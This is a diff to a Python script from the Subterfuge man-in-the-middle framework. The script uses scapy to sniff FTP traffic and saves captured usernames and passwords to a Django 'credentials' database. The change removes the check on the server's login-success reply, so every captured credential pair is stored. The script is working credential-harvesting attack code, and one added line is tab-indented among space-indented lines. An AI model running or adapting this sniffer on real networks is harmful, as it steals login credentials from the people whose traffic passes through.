@@ -26,6 +26,7 @@ from scapy.all import *
 import os
 import sys
 sys.path.append('/usr/share/subterfuge')
+sys.path.append('/usr/share')
 import getopt
 import time
 import datetime
@@ -34,15 +35,19 @@ import datetime
 import warnings
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 
+import django
+django.setup()
+'''
 from django.conf import settings
 settings.configure(DATABASE_ENGINE="sqlite3",
                    DATABASE_HOST="",
                    DATABASE_NAME= "/usr/share/subterfuge/db",
                    DATABASE_USER="",
                    DATABASE_PASSWORD="")
+'''
 
 from django.db import models
-from main.models import credentials
+from subterfuge.main.models import credentials
 
 #################################
 ##### Define some constants #####
@@ -104,33 +109,15 @@ def getFtpCredentials(pkt):
         if pw:
             last_ftp_pw=pw[0]
 
-    if sport=='21':
-        raw=raw[1:-5]
-
-        # From server
-        reason=''
         if last_ftp_login and last_ftp_pw:
-            success=re.findall(r'^230',raw)
-            if success:
-                status=login_success
-            else:
-                failed=re.findall(r'^530 (.*)',raw)
-                if failed:
-                    reason=' ('+failed[0]+')'
-                    status=login_failed
+            now = datetime.datetime.now()
+            date = now.strftime("%d-%m-%Y %H:%M")
+	    addsrc = "FTP: "
+            logcred = credentials(source = addsrc + dst, username = last_ftp_login, password = last_ftp_pw, date = date)
+            logcred.save()
 
-            if success:
-                msg='FTP: Login '+dst+' -> '+src+': '+status+': '
-                msg=msg+last_ftp_login+': '+last_ftp_pw+reason
-                log.info(msg)
-		now = datetime.datetime.now()
-        	date = now.strftime("%d-%m-%Y %H:%M")
-		addsrc = "FTP: "
-        	logcred = credentials(source = addsrc + src, username = last_ftp_login, password = last_ftp_pw, date = date)
-        	logcred.save()
-
-                last_ftp_login=''
-                last_ftp_pw=''
+            last_ftp_login=''
+            last_ftp_pw=''
 
 #####################################################
 ##### callback: called for each packet received #####
